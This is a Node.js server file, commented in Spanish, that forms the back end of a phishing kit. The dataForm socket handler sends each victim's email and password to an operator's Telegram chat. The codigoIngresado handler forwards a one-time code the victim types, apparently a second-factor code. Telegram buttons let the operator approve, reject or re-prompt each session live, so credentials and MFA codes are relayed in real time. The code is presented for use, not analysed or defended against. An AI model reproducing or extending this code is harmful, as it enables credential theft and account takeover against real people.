// server.js
require('dotenv').config();
const express = require('express');
const app = express();
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const bodyParser = require('body-parser');

const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const telegramChatId = process.env.TELEGRAM_CHAT_ID;
const activeSockets = new Map();

app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

io.on('connection', (socket) => {
  console.log('🧠 Usuario conectado:', socket.id);

  // Al recibir datos del formulario principal
  socket.on('dataForm', ({ correo, contrasena, sessionId }) => {
    activeSockets.set(sessionId, socket); // Guardar el socket con sessionId

    const mensaje = `🔐 Nuevo intento de acceso:\n\n📧 Correo: ${correo}\n🔑 Contraseña: ${contrasena}`;
    const botones = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ Aceptar', callback_data: `aprobado_${sessionId}` },
            { text: '❌ Rechazar', callback_data: `rechazado_${sessionId}` }
          ]
        ]
      }
    };

    bot.sendMessage(telegramChatId, mensaje, botones);
  });

  // Al reconectar el usuario
  socket.on('reconectar', (sessionId) => {
    activeSockets.set(sessionId, socket);
  });

  // Cuando se envía el código desde bienvenido.html
  socket.on('codigoIngresado', ({ codigo, sessionId }) => {
    activeSockets.set(sessionId, socket);

    const mensaje = `🔍 El usuario ingresó el siguiente código:\n\n🧾 Código: ${codigo}`;
    const botones = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '❌ Error de código', callback_data: `error_${sessionId}` },
            { text: '🔁 Pedir usuario', callback_data: `pedir_${sessionId}` }
          ]
        ]
      }
    };

    bot.sendMessage(telegramChatId, mensaje, botones);
  });
});

// Cuando se presiona un botón en Telegram
bot.on('callback_query', (query) => {
  const data = query.data;
  const chatId = query.message.chat.id;
  const callbackId = query.id;

  bot.answerCallbackQuery(callbackId); // Confirmar a Telegram

  // Manejo de botones de acceso
  if (data.startsWith('aprobado_') || data.startsWith('rechazado_')) {
    const sessionId = data.split('_')[1];
    const socket = activeSockets.get(sessionId);

    if (socket) {
      const decision = data.startsWith('aprobado_') ? 'aprobado' : 'rechazado';
      socket.emit('respuesta', decision);
      bot.sendMessage(chatId, decision === 'aprobado' ? '✅ Acceso aprobado.' : '❌ Acceso denegado.');
    } else {
      bot.sendMessage(chatId, '⚠️ No se encontró la sesión del usuario.');
    }

    activeSockets.delete(sessionId);
  }

  // Manejo de botones tras el ingreso de código
  else if (data.startsWith('error_') || data.startsWith('pedir_')) {
    const sessionId = data.split('_')[1];
    const socket = activeSockets.get(sessionId);

    if (socket) {
      const decision = data.startsWith('error_') ? 'error' : 'pedir_usuario';
      socket.emit('respuestaCodigo', decision);
      bot.sendMessage(chatId, decision === 'error' ? '⚠️ Código incorrecto.' : '🔁 Ingrese nuevamente su usuario.');
    } else {
      bot.sendMessage(chatId, '⚠️ No se encontró la sesión del usuario.');
    }

    activeSockets.delete(sessionId);
  }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`🚀 Servidor escuchando en el puerto ${PORT}`);
});
